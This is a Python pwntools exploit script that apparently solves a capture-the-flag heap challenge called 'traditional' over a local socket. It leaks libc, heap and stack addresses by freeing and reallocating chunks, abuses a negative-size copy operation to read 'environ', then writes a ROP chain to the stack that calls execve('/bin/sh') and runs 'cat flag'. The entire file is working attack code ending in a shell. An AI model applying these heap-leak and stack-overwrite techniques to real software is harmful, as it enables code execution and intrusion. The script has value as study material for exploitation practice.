#!/bin/python3
from pwn import *

table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
def custom_base64_encode(data:bytes) -> bytes:

    encoded = base64.b64encode(data).decode()
    translation_table = str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", table)
    return encoded.translate(translation_table).encode()

context(arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])

# gdb.attach(io)
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     = lambda s                  :info(f"{s} ==> 0x{eval(s):x}")


menu = lambda s:sla(b'choice: ',custom_base64_encode(s))

def add(size,idx):
    menu(b'1')
    sl(custom_base64_encode(str(size).encode()))
    sl(custom_base64_encode(str(idx).encode()))

def free(idx):
    menu(b'4')
    sl(custom_base64_encode(str(idx).encode()))

def show(idx):
    menu(b'3')
    sl(custom_base64_encode(str(idx).encode()))

def edit(idx,content):
    menu(b'2')
    sl(custom_base64_encode(str(idx).encode()))
    sl(custom_base64_encode(content))

def edit(idx,content):
    menu(b'2')
    sl(custom_base64_encode(str(idx).encode()))
    sl(custom_base64_encode(content))

def copy(src,dst,size):
    menu(b'7')
    sl(custom_base64_encode(str(src).encode()))
    sl(custom_base64_encode(str(dst).encode()))
    sl(custom_base64_encode(str(size).encode()))

file = './traditional'
elf = ELF(file)
libc = ELF('./lib/x86_64-linux-gnu/libc.so.6')
io = remote('127.0.0.1',8888)
for i in range(8):
    add(0x100,i)

for i in range(1,8):
    free(i)

free(0)
for i in range(1,8):
    add(0x100,i)
add(0x100,0)

show(0)

libc.address = u64(r(6).ljust(8,b'\x00'))-0x233c20

show(7)
heap = u64(r(5).ljust(8,b'\x00'))<<12

add(0x380,10)
free(10)

pay = b'a'*96+p64(libc.sym['environ']-0x18)
edit(0,pay)
pay = b'b'*0x100
edit(7,pay)

copy(7,0,(-0x10)&0xffffffff)

add(0x380,10)
copy(0,10,0x19)
show(10)

r(0x18)
stack = u64(r(6).ljust(8,b'\x00'))

add(0x390,11)
free(11)
pay = b'a'*(96+8)+p64(stack-0x11f2-0x20)
edit(0,pay)

copy(7,0,(-0x10)&0xffffffff)

add(0x390,11)

inf('libc.address')

inf('heap')

inf('stack')
# gdb.attach(io,'directory ~/桌面/source/glibc-2.42\nb *$rebase(0x3A5E)')

# pause()
rdi = 0x000000000011b87a+libc.address

rsi = 0x000000000005c207+libc.address
rdx = 0x0000000000048c92+libc.address

pay = p64(rdi+1)*(0x20-9)+p64(rdi)+p64(next(libc.search(b'/bin/sh\x00')))+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(libc.sym['execve'])
edit(7,pay)
copy(7,11,0x100)

sl(b'cat flag')

io.interactive()
